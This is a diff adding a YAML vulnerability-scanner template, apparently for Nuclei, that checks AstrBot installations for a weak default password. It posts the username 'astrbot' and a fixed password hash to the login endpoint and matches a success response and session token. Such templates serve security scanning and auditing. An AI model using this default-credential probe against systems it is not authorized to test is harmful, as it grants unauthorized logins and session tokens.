@@ -1,0 +1,29 @@
+id: poc-yaml-astrbot-weak-passwd
+info:
+  name: AstrBot Weak Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: weak-password
+http:
+  - raw:
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"astrbot","password":"77b90590a8945a7d36c963981a307dc9"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"status\":\"ok\""
+          - "\"username\":\"astrbot\""
+          - "true"
+      - type: regex
+        part: body
+        regex:
+          - "\"token\":\"([0-9a-zA-Z.]+)\""
